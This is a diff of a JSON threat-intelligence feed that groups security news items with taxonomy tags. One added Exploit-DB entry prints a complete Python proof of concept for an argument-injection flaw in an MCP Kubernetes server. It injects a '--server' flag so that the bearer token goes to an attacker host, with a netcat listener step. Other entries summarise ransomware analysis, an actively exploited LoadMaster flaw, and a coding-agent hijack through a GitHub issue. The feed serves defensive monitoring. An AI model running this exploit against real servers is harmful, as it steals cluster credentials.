+          "published": "2026-08-11T00:00:00+00:00",
+          "summary": "Minerals become chips. Chips become data centers. Data centers become models, and models are acquiring arms and legs. From Earth to Embodied AI traces the supply chain of the fourth industrial revolution, and shows how geopolitical rivalry and cyber operations now run along every link, from mine to machine.",
+          "taxonomy": {
+            "threat_categories": [
+              "supply_chain",
+              "apt_espionage"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "c9f01215de",
+      "priority_score": 17,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "Kubernetes"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Anthropic/Claude",
+          "GitHub",
+          "Kubernetes"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-61459"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "critical_cvss",
+          "poc_available"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research",
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+        "link": "https://www.exploit-db.com/exploits/52638",
+        "published": "2026-08-11T00:00:00+00:00",
+        "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Kubernetes",
+            "Anthropic/Claude",
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-61459"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "poc_available",
+            "critical_cvss"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Kubernetes": "target",
+            "Anthropic/Claude": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+          "link": "https://www.exploit-db.com/exploits/52638",
+          "published": "2026-08-11T00:00:00+00:00",
+          "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes",
+              "Anthropic/Claude",
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-61459"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "poc_available",
+              "critical_cvss"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Kubernetes": "target",
+              "Anthropic/Claude": "target",
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
+          "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
+          "published": "2026-08-10T16:00:00+00:00",
+          "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Kubernetes": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "28ff3120b5",
       "priority_score": 16,
       "member_count": 5,
@@ -2110,36 +2341,6 @@
           }
         },
         {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "WordPress Plugins Compromised Without a Single File Change",
-          "link": "https://www.infosecurity-magazine.com/news/bdthemes-wordpress-poisoned-api/",
-          "published": "2026-08-10T14:30:00+00:00",
-          "summary": "Poisoned JSON feed let attackers backdoor WordPress sites without changing any plugin files",
-          "taxonomy": {
-            "threat_categories": [
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
           "source": "BleepingComputer",
           "cohort": "cyber_news_breach_reporting",
           "title": "BdThemes plugins supply-chain hack creates rogue WordPress admins",
@@ -2160,6 +2361,36 @@
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "WordPress": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "WordPress Plugins Compromised Without a Single File Change",
+          "link": "https://www.infosecurity-magazine.com/news/bdthemes-wordpress-poisoned-api/",
+          "published": "2026-08-10T14:30:00+00:00",
+          "summary": "Poisoned JSON feed let attackers backdoor WordPress sites without changing any plugin files",
+          "taxonomy": {
+            "threat_categories": [
+              "web_shell_backdoor"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "WordPress"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
             "role_map": {
               "WordPress": "target"
@@ -2402,7 +2633,7 @@
     {
       "cluster_id": "e8d811cf69",
       "priority_score": 16,
-      "member_count": 16,
+      "member_count": 17,
       "corroborating_source_count": 8,
       "strong_signals": [
         "OpenAI/ChatGPT"
@@ -2429,7 +2660,8 @@
           "zero_day"
         ],
         "content_type": [
-          "news_report"
+          "news_report",
+          "vendor_announcement"
         ],
         "confidence_tier": [
           "tier_1_primary_research",
@@ -2661,27 +2893,29 @@
         {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
-          "title": "Claude Code and Gemini CLI Flaws Let a GitHub Issue Reach CI Workflow Secrets",
-          "link": "https://thehackernews.com/2026/08/claude-code-and-gemini-cli-flaws-let.html",
-          "published": "2026-08-07T08:18:35+00:00",
-          "summary": "A GitHub issue opened by an account with no repository privileges was enough to execute code on the CI runners behind Anthropic's and Google's own coding-agent repositories. On OpenAI's, it was enough to hijack the next agent run. Novee Security ran the attack against each vendor's agent in the configuration that the vendor ships by default, and presented the work at Black Hat USA on August 5.",
+          "title": "OpenAI Launches GPT-5.6-Cyber with Reduced Safeguards for Exploit Development",
+          "link": "https://thehackernews.com/2026/08/openai-launches-gpt-56-cyber-with.html",
+          "published": "2026-08-11T13:11:23+00:00",
+          "summary": "OpenAI on Monday unveiled a new cybersecurity-focused model called GPT‑5.6‑Cyber that it said is focused on vulnerability research, penetration testing, and incident response. \"Built on GPT‑5.6 Sol, it is trained to improve capabilities on several specialized cybersecurity tasks (e.g., finding zero-day vulnerabilities and developing exploit chains) and to reduce refusals for certain higher-risk",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "zero_day"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [
-              "OpenAI/ChatGPT",
-              "Anthropic/Claude"
+              "OpenAI/ChatGPT"
             ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "vendor_announcement",
             "confidence_tier": "tier_4_news",
             "role_map": {
-              "OpenAI/ChatGPT": "target",
-              "Anthropic/Claude": "target"
+              "OpenAI/ChatGPT": "target"
             },
             "weak_tags": {
               "products": []
@@ -2712,135 +2946,6 @@
             "role_map": {
               "Anthropic/Claude": "target",
               "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "815134b7b7",
-      "priority_score": 15,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation",
-          "ransomware_extortion",
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "Fortinet",
-          "SonicWall"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-8037"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited",
-          "no_patch_yet",
-          "preauth_unauth",
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "BleepingComputer",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Critical Progress LoadMaster flaw now actively exploited in attacks",
-        "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-progress-loadmaster-flaw-exploited-in-attacks/",
-        "published": "2026-08-10T09:49:37+00:00",
-        "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned that hackers are exploiting a critical-severity Progress Kemp LoadMaster command injection vulnerability. [...]",
-        "full_body": "Critical Progress LoadMaster flaw now actively exploited in attacks By Sergiu Gatlan August 10, 2026 05:49 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned that hackers are exploiting a critical-severity Progress Kemp LoadMaster command injection vulnerability. Kemp LoadMaster is a very popular Application Delivery Controller (ADC) and server load balancer used by tech companies and government entities worldwide (e.g., Amazon, U.S. Air Force) to distribute incoming web traffic across multiple servers, optimize app performance, and ensure high service availability. Progress Software says that 80% of Fortune 500 companies use its products and services, with Kemp LoadMaster having over 100,000 deployments worldwide. Tracked as CVE-2026-8037 , this critical command injection security flaw enables unauthenticated attackers to execute arbitrary commands on unpatched LoadMaster appliances by exploiting unsanitized API inputs in multiple command endpoints. In June, Progress Software released security updates to patch the vulnerability in Kemp LoadMaster (GA v7.2.63.1 or older and LTSF v7.2.54.17 or older), and it also confirmed that it impacts all MOVEit WAF (Web Application Firewall) versions before GA v7.2.63.2 . According to Internet threat watchdog Shadowserver, nearly 300 Kemp LoadMaster instances are exposed online. However, there is no information regarding how many of them are honeypots or have already been secured against CVE-2026-8037 attacks. On Friday, CISA added the flaw to its catalog of actively exploited vulnerabilities , ordering U.S. Federal Civilian Executive Branch (FCEB) agencies to secure their servers within three days as mandated by Binding Operational Directive 26-04. \"This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise,\" the cybersecurity agency warned. While BOD 26-04 applies only to U.S. government agencies, CISA urged all defenders to prioritize patching the CVE-2026-8037 vulnerability to block incoming attacks. Last month, Progress also emailed ShareFile customers who were using Storage Zone Controllers to immediately shut down servers after identifying what it described at the time as a \"credible external security threat\" targeting the on-premises secure file-sharing software. Days later, the company released security patches for a high-severity ShareFile path traversal zero-day vulnerability, but told BleepingComputer that it had \"no indication of unauthorized access to any ShareFile customer account or data, and we have not identified any active threat.\" Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: CISA: SonicWall SMA1000 flaws now exploited by ransomware gangs Cisco warns of FMC static credential flaw exploited in zero-day attacks Check Point warns of SmartConsole zero-day exploited in attacks CISA orders urgent action on actively exploited Langflow RCE flaw CISA urges immediate action on actively exploited Fortinet flaws",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "zero_day",
-            "active_exploitation"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government"
-          ],
-          "affected_products": [
-            "Fortinet",
-            "SonicWall"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-8037"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited",
-            "zero_day",
-            "preauth_unauth",
-            "no_patch_yet"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Fortinet": "target",
-            "SonicWall": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Critical Progress LoadMaster flaw now actively exploited in attacks",
-          "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-progress-loadmaster-flaw-exploited-in-attacks/",
-          "published": "2026-08-10T09:49:37+00:00",
-          "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned that hackers are exploiting a critical-severity Progress Kemp LoadMaster command injection vulnerability. [...]",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "zero_day",
-              "active_exploitation"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [
-              "Fortinet",
-              "SonicWall"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-8037"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited",
-              "zero_day",
-              "preauth_unauth",
-              "no_patch_yet"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Fortinet": "target",
-              "SonicWall": "target"
             },
             "weak_tags": {
               "products": []
@@ -3090,6 +3195,81 @@
             "role_map": {
               "OpenAI/ChatGPT": "target"
             },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "0c38643ce6",
+      "priority_score": 13,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Sysdig",
+        "cohort": "detection_response_operations",
+        "title": "Vulnerability response in the AI-discovery era",
+        "link": "https://webflow.sysdig.com/blog/vulnerability-response-in-the-ai-discovery-era",
+        "published": "2026-08-11T00:00:00+00:00",
+        "summary": "",
+        "full_body": "< back to blog Vulnerability response in the AI-discovery era Published by: Ivan Evsyukov @ linkedin Published: August 11, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more What changes when AI can find vulnerabilities faster than teams can fix them, and a four-part plan for dealing with it. Frontier AI models can now find vulnerabilities at a scale and speed humans can't match , with Mythos as the current high-water mark. That includes flaws with no CVE attached, in code that has been reviewed for decades. Access to the strongest models is restricted today , but the capability is spreading , and attackers get it too. Here is the practical problem: finding vulnerabilities got fast and cheap. Triaging them, fixing them, and containing what gets exploited did not. If your program was already behind on its backlog, this makes it worse. So in this post, we’ll explore what actually changes, and how to build a program that keeps up. Four shifts in the ground rules 1. There are more vulnerabilities than established institutions can process. CVE creation doesn't keep up with what AI can find , so some real findings will never have a CVE at all. Regardless of whether something has a CVE, if it represents a real business risk, your team owns doing something about it. 2. Exploits get faster and cheaper for attackers. The time from a vulnerability being known to it being exploited has collapsed. Mandiant's latest M-Trends report estimates the average time-to-exploit at negative seven days . This means that exploitation now begins before a patch exists. Your response and remediation times have to come down to match. 3. Risk acceptance gets harder to justify. There is an industry narrative that AI makes defense faster and cheaper, so leaving things unfixed looks less like a resource problem and more like a decision. Boards and auditors will expect security teams to operate faster and cheaper with AI, because attackers will. 4. Your whole attack surface is more exposed. Software, configuration, and identity weaknesses can all be discovered and probed at machine speed. This post focuses on software vulnerabilities, but the principles can be extended to other common attack vectors as well. On a positive note: For any given codebase, this will be a surge and not an endless flood. Code is finite, and most AI-found flaws are known vulnerability classes with known fixes. The hard part isn't that the vulnerabilities are exotic, it's the volume of the vulnerabilities. How to create a program for the new landscape: A four-part plan Closing this gap is the security team's job. The same class of AI tools helping attackers is available to defenders. Use it — for triage, for routing fixes, and for response. The plan outlined below will help you achieve this. Each part of the plan exists because the one before it isn't enough. You'll find more than you can triage, you'll triage more than you can fix, and you won't fix everything. 1. Scan and discover For this first step, the goal is that everything found ends up in one place you can manage. CVE discovery is the straightforward part: Make sure every important asset is actually covered, whether that takes one very complete vendor or a combination of sources. The new work is non-CVE findings. Your scanning needs to pull in vulnerability data beyond the CVE catalog, including AI-discovered flaws, and feed it into the same triage and remediation process as everything else. A tool that only manages CVEs is blind to this new class of findings. Luckily, the remediation and response patterns remain the same, as the non-CVE vulnerabilities are tied to what we know how to fix — libraries, binaries, and images. 2. Prioritize Even before AI, only the most mature security and engineering orgs could fix everything. Now proper triage is even more ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Sysdig",
+          "cohort": "detection_response_operations",
+          "title": "Vulnerability response in the AI-discovery era",
+          "link": "https://webflow.sysdig.com/blog/vulnerability-response-in-the-ai-discovery-era",
+          "published": "2026-08-11T00:00:00+00:00",
+          "summary": "",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -3485,264 +3665,6 @@
       ]
     },
     {
-      "cluster_id": "963c57eb1b",
-      "priority_score": 11,
-      "member_count": 2,
-      "corroborating_source_count": 2,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft",
-          "data_breach",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "Microsoft Defender"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Microsoft Security Blog",
-        "cohort": "threat_research_primary",
-        "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
-        "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
-        "published": "2026-08-10T15:00:00+00:00",
-        "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
-        "full_body": "Share Link copied to clipboard! Tags Credential theft Extortion Ransomware Windows Threats intelligence Cybercrime Ransomware Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Endpoint Topics Threat intelligence Microsoft Threat Intelligence tracks DeadLock ransomware as an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications and data leak operations. Its recovery ecosystem combines the Session messaging network with blockchain-backed services that store and deliver resources used throughout the extortion process. This architecture likely increases the resilience of portions of its communication, leak-hosting, and negotiation infrastructure, allowing DeadLock operators to recover from some disruption efforts while maintaining continuity for victims. Microsoft has observed DeadLock ransomware being deployed by multiple groups including an affiliate of the Lynx and INC ransomware ecosystems. First observed in July 2025, DeadLock operators employ double extortion tactics, encrypting victim environments while threatening to publicly release exfiltrated data. As of July 2026, the operators have published more than 80 compromised organizations on their data leak site, called the DeadLock blog, with more than half of the claimed victims in Europe. Microsoft identified DeadLock ransomware impacting organizations across information technology (IT), mining, transportation and logistics, manufacturing, hospitality, consumer goods, and other sectors in Europe, Asia, North America, South America, and Africa. The DeadLock encryptor includes a resource-aware throttling mechanism designed to maintain system responsiveness during encryption. In addition to its encryption capabilities, the ransomware also appears to implement language or country-based geofencing designed to avoid running in environments associated with former Soviet and Commonwealth of Independent States (CIS)-linked countries as well as select Middle Eastern countries, a pattern commonly observed among ransomware operators believed to operate from those regions. Together, these capabilities demonstrate how DeadLock combines established ransomware tradecraft with decentralized infrastructure designed to improve operational resilience. In this blog, we present a technical analysis of the DeadLock ransomware encryptor, covering its execution flow, defense evasion techniques, encryption design, and post-encryption behaviors, including a decentralized recovery chat system. We also provide indicators of compromise (IOCs), Microsoft Defender detections, and mitigation guidance to help organizations defend against this threat and similar ransomware activity. Pre-encryption Configuration parsing Before performing any malicious activity, the DeadLock encryptor decrypts an embedded configuration blob using XOR decoding with an 8-byte key. Below are the malware’s configuration fields and their values. Field Value Victim UID <redacted> Malware public key 03bf50bbf97c4e951e66ff12b689a37a3ce675b4921e254eae76da77573843e4a9 Encryption rule 1000,05052429880,025124288000,010524288000,F991114288000 Language exclude list Geofencing language IDs (see Language geofencing ) Process stop list Processes to terminate (see Process and service termination ) Service stop list Services to stop and delete (see Process and service termination ) File exclude list Extensions and file names to avoid encrypting (see Directory traversal ) Directory exclude list Pre-traversal filter with directories to avoid encrypting (see Directory traversal ) Sub-path Exclude List Sub-paths to avoid encrypting during traversal (see Directory traversal ) Text ransom note Full text ransom note content (see Ransom notes deployment ) HTML recovery chat Full HTML/JS interactive chat page (see Recovery chat: Technical architecture ) Language geofencing As an early exit check, the malware ",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "credential_theft",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "Microsoft Defender"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Microsoft Defender": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Microsoft Security Blog",
-          "cohort": "threat_research_primary",
-          "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
-          "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
-          "published": "2026-08-10T15:00:00+00:00",
-          "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "credential_theft",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "Microsoft Defender"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Microsoft Defender": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Microsoft Threat Intelligence",
-          "cohort": "threat_research_primary",
-          "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
-          "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
-          "published": "2026-08-10T15:00:00+00:00",
-          "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "data_breach"
-            ],
